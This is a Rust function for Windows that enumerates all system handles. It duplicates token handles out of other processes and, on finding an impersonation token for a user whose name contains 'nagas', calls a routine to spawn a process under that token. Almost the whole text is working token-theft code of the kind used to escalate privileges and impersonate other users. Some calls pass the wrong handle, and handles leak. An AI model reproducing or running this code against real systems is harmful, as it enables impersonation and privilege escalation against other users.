pub fn getalltokenhandles(){
    unsafe{

        let mut i =0;
        let mut bytesneeded = 0;
        
        let mut buffer = loop{
            
            let mut buffer = vec![0u8;bytesneeded as usize];
            let ntstatus2 =  NtQuerySystemInformation(SystemHandleInformation, 
                buffer.as_mut_ptr() as *mut c_void, 
                bytesneeded, 
                &mut bytesneeded);

                //println!("bytes needed: {}",bytesneeded);


                if NT_SUCCESS(ntstatus2)  {
                    break buffer;
                }
                if  !NT_SUCCESS(ntstatus2){
                    //println!("NtQuerySystemInformation failed: {}",ntstatus2);
                    i+=1;
                }   
        };

       println!("bytesneeded: {}",bytesneeded);
       
       
        let  handleinfo = *(buffer.as_mut_ptr() as *mut SYSTEM_HANDLE_INFORMATION);

        println!("number of handles: {}",handleinfo.NumberOfHandles);
        

        println!("size of handle table entry info: {}",
        std::mem::size_of::<SYSTEM_HANDLE_TABLE_ENTRY_INFO>());

        for i in 0..handleinfo.NumberOfHandles{
            let tableentry = *((buffer.as_mut_ptr() as usize + 8 + 
            (i as usize * std::mem::size_of::<SYSTEM_HANDLE_TABLE_ENTRY_INFO>()))
             as *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO);


            

            let prochandle = OpenProcess(PROCESS_DUP_HANDLE , 0, tableentry.UniqueProcessId as u32);
            if prochandle.is_null(){
                //println!("openprocessfailed: {}",GetLastError());
                continue;
            }
            //println!("prochandle: {:x?}",prochandle);

            let mut duphandle = 0 as *mut c_void;
            let res = DuplicateHandle(prochandle, 
                tableentry.HandleValue as *mut c_void, 
                GetCurrentProcess(), 
                &mut duphandle, 
                0, 0, DUPLICATE_SAME_ACCESS);
            //println!("duphandle: {:x?}",duphandle);
            if res==0{
                //println!("duplicatehandle failed: {}",GetLastError());
                CloseHandle(prochandle);
                continue;
            }

            

            let mut reqlength = 0;
            let mut objinfo = vec![0u8;reqlength as usize];
            let ntstatus = NtQueryObject(duphandle, 
                2, 
                objinfo.as_mut_ptr() as *mut c_void, 
                objinfo.len() as u32, 
                &mut reqlength);

            //println!("{:x?}",ntstatus);
            if reqlength == 0{
                continue;
            }

            let mut objinfo = vec![0u8;reqlength as usize];
            //println!("req length: {}",reqlength);
            let ntstatus = NtQueryObject(duphandle, 
                2, 
                objinfo.as_mut_ptr() as *mut c_void, 
                objinfo.len() as u32, 
                &mut reqlength);

            let typeinfo = *(objinfo.as_mut_ptr() as *mut OBJECT_TYPE_INFORMATION);

            let typename = unicodetostring(&typeinfo.TypeName, 
                    GetCurrentProcess());
                
                if typename.contains("Token"){
                     
                    let res1 = gettokenuserinfo(tableentry.HandleValue as *mut c_void) ;     
                    if res1.is_ok(){
                        println!("uniqueprocessid: {}",tableentry.UniqueProcessId);
                        println!("handle value: {:x?}",tableentry.HandleValue);
                        println!("object: {:x?}",tableentry.Object);
                        println!("typename: {}",typename);  
                        
                        gettokenstatistics(duphandle as *mut c_void);
                        println!("{}",res1.clone().ok().unwrap());
                        if res1.ok().unwrap().to_string().contains("nagas"){
                            if isimpersonatedtoken(duphandle){
                                duplicatetokenandspawn(tableentry.HandleValue as *mut c_void );
                                break;
                            }
                            

                        }
                        println!();
                    
                    }
                
                }

                CloseHandle(prochandle);
                //break;

        }




        

    }
}

